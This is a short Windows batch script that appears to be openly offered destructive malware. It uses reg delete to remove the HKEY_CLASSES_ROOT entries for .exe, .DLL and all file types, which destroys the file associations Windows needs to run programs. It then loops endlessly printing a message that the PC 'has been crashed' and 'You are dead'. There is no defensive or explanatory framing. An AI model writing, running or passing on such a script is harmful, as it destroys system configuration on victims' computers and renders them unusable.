@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.DLL
START reg delete HKCR/*
: MESSAGE
ECHO Your pc has been crashed.You are dead.
GOTO MESSAGE 
